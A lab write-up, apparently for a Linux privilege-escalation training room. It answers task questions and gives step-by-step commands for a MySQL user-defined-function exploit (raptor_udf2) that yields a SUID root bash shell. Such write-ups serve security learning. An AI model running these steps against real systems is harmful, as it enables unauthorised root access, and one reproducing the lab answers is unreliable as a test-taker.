# 🚀 Task Writeups
## Task 1 
### Q1: Deploy the machine and login to the "user" account using SSH.
Ans: **No answer needed**
### Q2: Run the "id" command. What is the result?
<p align="center">
  <img width="764" height="49" alt="image175" src="https://github.com/user-attachments/assets/9753b947-7b6a-4c2c-ad10-e540aa9fe940" />

Ans: **uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)**

## Task 2 Service Exploit
Since the MySQL service is running as "root" user for the servicee does not have password assigned. We will takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change to the home/user/tools/mysql-udf directory.<br>
`cd /home/user/tools/mysql-udf`

Next we should compile the raptor_udf2.c exploit code using this commands:<br>
`gcc -g -c raptor_udf2.c -fPIC`<br>
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`<br>

Connext to the MySQL service using root user with blank password.<br>
`mysql -u root`<br>

Execute following commands and create a UDF "do_system" using our compiled exploit:<br>
`use mysql;`<br>
`create table foo(line blob);`<br>
`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`<br>
`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`<br>
`create function do_system returns integer soname 'raptor_udf2.so';`<br>

Next, we can use the function to copy /bin/bash /tmp/rootbash and set the SUID permission:<br>
`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`<br>

Exit MySQL and run the tmp/rootbash executable with -p to gain a shell running with root privileges.<br>
<p align="center">
  <img width="385" height="127" alt="image29" src="https://github.com/user-attachments/assets/31d4e385-83c2-4da9-a96a-b77f2e4dcaec" />
</p>
